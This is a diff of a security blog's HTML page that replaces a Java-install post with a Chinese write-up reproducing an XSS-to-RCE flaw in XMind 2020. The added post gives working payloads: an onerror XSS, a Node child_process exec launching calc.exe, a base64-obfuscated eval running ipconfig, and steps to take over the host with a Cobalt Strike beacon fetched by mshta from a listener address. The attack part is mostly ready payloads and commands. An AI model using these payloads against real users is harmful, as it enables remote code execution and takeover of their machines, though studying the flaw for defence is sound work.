@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Centos7服务器安装java环境, Web安全,CTF,PHP,漏洞复现,渗透测试,工具分享,Python,代码审计,靶场攻略等">
+    <meta name="keywords" content="XMind思维导图XSS漏洞复现, Web安全,CTF,PHP,漏洞复现,渗透测试,工具分享,Python,代码审计,靶场攻略等">
     <meta name="description" content="专注于Web安全,分享生活,分享知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Centos7服务器安装java环境 | Salute&#39;s blogs</title>
+    <title>XMind思维导图XSS漏洞复现 | Salute&#39;s blogs</title>
     <link rel="icon" type="image/jpeg" href="/salute.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -319,12 +319,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Centos7服务器安装java环境</h1>
+                    <h1 class="description center-align post-title">XMind思维导图XSS漏洞复现</h1>
                 </div>
             </div>
         </div>
@@ -440,12 +440,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Linux/">
-                                <span class="chip bg-color">Linux</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
-                            <a href="/tags/%E8%8F%9C%E9%B8%A1%E6%97%A5%E5%B8%B8/">
-                                <span class="chip bg-color">菜鸡日常</span>
+                            <a href="/tags/XSS/">
+                                <span class="chip bg-color">XSS</span>
                             </a>
                         
                     </div>
@@ -456,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Linux/" class="post-category">
-                                Linux
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -483,7 +483,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    346
+                    463
                 </div>
                 
 
@@ -505,47 +505,50 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>前言：最近看到阿里云主机有新人优惠，嘿嘿。我就注册了一个新的账号，买了一台，然后开始安装我们的各种工具。但是，安装工具时发现java环境没有装，于是我就开始我的安装之旅。<br>1.打开url选择jdk1.8下载</p>
-<p>[<a target="_blank" rel="noopener" href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html]">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html]</a></p>
-<p>我选择Linux x64的版本：</p>
-<p><img src="../images/1.png"></p>
-<p>2.下载</p>
-<p>这里你可以选择在服务器中直接使用命令：</p>
-<pre><code>wget https://download.oracle.com/otn/java/jdk/8u291-b10/d7fc238d0cbf4b0dac67be84580cfb4b/jdk-8u291-linux-x64.tar.gz
+                <p><strong>简介</strong>：XMind 是一个全功能的思维导图和头脑风暴软件，为激发灵感和创意而生。作为一款有效提升工作和生活效率的生产力工具，受到全球百千万用户的青睐。近期各大公众号平台曝出XMind xss存在远程执行RCE漏洞，我也是今天进行了漏洞复现。</p>
+<p><strong>环境</strong>：XMind-2020-for-Windows-64bit-10.3.1-202101070032.exe</p>
+<p><strong>复现</strong>：</p>
+<p>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</p>
+<p>payload：</p>
+<pre><code>&lt;img src=# onerror=alert('1')&gt;
 </code></pre>
-<p>当然了你也可以将压缩包下载到本地利用finalshell进行上传</p>
-<p><img src="../images/2.png"></p>
-<p>下载之后通过命令核对安装包大小是否符合</p>
-<pre><code>ls -lht
+<p><img src="../images/4.png"></p>
+<p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p>
+<p>2.测试RCE命令，我们通过打开计算器来展示。</p>
+<p>payload：</p>
+<pre><code>&lt;img src=1 onerror="require('child_process').exec('calc.exe',null);"&gt;
 </code></pre>
-<p>3.安装</p>
-<p>（1）首先创建安装目录</p>
-<pre><code>mkdir /usr/local/java/
+<p><img src="../images/5.png"></p>
+<p>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</p>
+<p>payload：</p>
+<pre><code>&lt;img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=`,`base64`).toString())'&gt;
 </code></pre>
-<p>（2）然后将下载下来的压缩包解压到安装目录</p>
-<pre><code>tar -zxvf jdk-8u291-linux-x64.tar.gz -C /usr/local/java
+<p>cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=经过base64解码是：</p>
+<pre><code>require('child_process').exec('ipconfig /all',(error, stdout, stderr)=&gt;{    alert(`stdout: ${stdout}`);
+  });
 </code></pre>
-<p>注意：这里的-C是指定压缩目录</p>
-<p>4.设置环境变量</p>
-<p>（1）打开文件</p>
-<pre><code>vim /etc/profile
+<p><img src="../images/6.png"></p>
+<p>4.我们直接上cs</p>
+<p><img src="../images/7.png"></p>
+<p>（1）首先我们生成一个powershell command的payload</p>
+<p><img src="../images/8.png"></p>
+<p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p>
+<p><img src="../images/9.png"></p>
+<p> 生成的url为：</p>
+<pre><code>http://你设置的监听器IP:80/download/file.ext
 </code></pre>
-<p>（2）shift+g进入文末，按i进入编辑模式，在最后一行开始添加</p>
-<pre><code>export JAVA_HOME=/usr/local/java/jdk1.8.0_291
-export JRE_HOME=${JAVA_HOME}/jre
-export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
-export PATH=${JAVA_HOME}/bin:$PATH
+<p>接下来我们只要执行如下代码就可以上线cs，其中mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>
+<pre><code>mshta http://你设置的监听器IP:80/download/file.ext
 </code></pre>
-<p>（3）使得环境变量生效</p>
-<pre><code>source /etc/profile
+<p>（3）接着我们构造执行的XSS代码</p>
+<p>原始攻击payload：</p>
+<pre><code>&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=&gt;{    alert(`stdout: ${stdout}`);
+
+ });`,`base64`).toString())'&gt;
 </code></pre>
-<p>（4）添加软连接（快捷方式）</p>
-<pre class=" language-shell"><code class="language-shell">ln -s /usr/local/java/jdk1.8.0_291/bin/java /usr/bin/java
-</code></pre>
-<p>5.检查</p>
-<pre><code>java -version
-</code></pre>
-<p><img src="../images/3.png"></p>
+<p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p>
+<p>接着我们就看到cs上线成功</p>
+<p><img src="../images/10.png"></p>
 
                 
             </div>
@@ -572,7 +575,7 @@ export PATH=${JAVA_HOME}/bin:$PATH
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://salute-s.github.io/2021/051762838.html">https://salute-s.github.io/2021/051762838.html</a>
+                    <a href="https://salute-s.github.io/2021/05177225.html">https://salute-s.github.io/2021/05177225.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -610,12 +613,12 @@ export PATH=${JAVA_HOME}/bin:$PATH
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Linux/">
-                                    <span class="chip bg-color">Linux</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
-                                <a href="/tags/%E8%8F%9C%E9%B8%A1%E6%97%A5%E5%B8%B8/">
-                                    <span class="chip bg-color">菜鸡日常</span>
+                                <a href="/tags/XSS/">
+                                    <span class="chip bg-color">XSS</span>
                                 </a>
                             
                         </div>
@@ -1053,9 +1056,10 @@ export PATH=${JAVA_HOME}/bin:$PATH
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/05177225.html">
                     <div class="card-image">
@@ -1073,9 +1077,9 @@ export PATH=${JAVA_HOME}/bin:$PATH
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1088,6 +1092,7 @@ export PATH=${JAVA_HOME}/bin:$PATH
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1107,7 +1112,7 @@ export PATH=${JAVA_HOME}/bin:$PATH
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2021/051762838.html">
@@ -1141,7 +1146,6 @@ export PATH=${JAVA_HOME}/bin:$PATH
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
